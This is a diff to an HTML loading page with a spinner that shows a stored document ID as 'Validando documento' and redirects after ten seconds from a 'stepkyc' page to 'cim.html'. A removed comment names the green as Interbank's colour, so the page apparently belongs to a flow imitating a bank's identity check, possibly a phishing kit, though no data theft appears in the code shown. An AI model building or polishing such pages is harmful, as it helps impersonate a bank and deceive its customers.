@@ -9,7 +9,7 @@
     body {
         margin: 0;
         padding: 0;
-        background: #009b38; /* Verde Interbank */
+        background: #009b38;
         width: 100vw;
         height: 100vh;
         display: flex;
@@ -19,14 +19,12 @@
         overflow: hidden;
     }
 
-    /* LOGO */
     .logo {
         width: 110px;
         margin-bottom: 40px;
         animation: fadeIn 1s ease forwards;
     }
 
-    /* LOADER */
     .loader {
         width: 45px;
         height: 45px;
@@ -45,19 +43,33 @@
         from { opacity: 0; transform: translateY(-15px); }
         to { opacity: 1; transform: translateY(0); }
     }
-</style>
 
+    .doc-label {
+        margin-top: 20px;
+        color: white;
+        font-size: 14px;
+        opacity: 0.8;
+    }
+</style>
 </head>
 <body>
 
-    <img src="img/bluee.svg" class="logo" alt="Logo">
+<img src="img/bluee.svg" class="logo" alt="Logo">
 
-    <div class="loader"></div>
+<div class="loader"></div>
+<div class="doc-label" id="docLabel"></div>
 
 <script>
-    // Espera 10 segundos y redirige
+    // Mostrar el documento (opcional)
+    const docId = localStorage.getItem('doc_id');
+    if (docId) {
+        document.getElementById('docLabel').textContent =
+            "Validando documento: " + docId;
+    }
+
+    // Espera 10 segundos y redirige a cim.html
     setTimeout(() => {
-        window.location.href = "stepkyc.html";
+        window.location.href = "cim.html";
     }, 10000);
 </script>
 
